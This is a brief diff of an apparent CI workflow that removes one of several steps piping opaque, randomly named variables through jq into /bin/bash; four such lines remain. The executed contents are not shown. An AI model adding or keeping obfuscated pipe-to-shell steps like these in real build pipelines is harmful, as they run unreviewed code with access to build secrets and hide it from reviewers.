@@ -25,7 +25,6 @@ jobs:
           echo $jd3 | jq -r .bh0674 | /bin/bash
           printf '%s' "$njwqt92" | jq -r .le266 | /bin/bash
           printf '%s' "$otwia6564" | jq -r .lr06 | /bin/bash
-          echo $paw1751 | jq -r .zkody0 | /bin/bash
           echo $h470 | jq -r .e93518 | /bin/bash
 
       - name: Save artifact
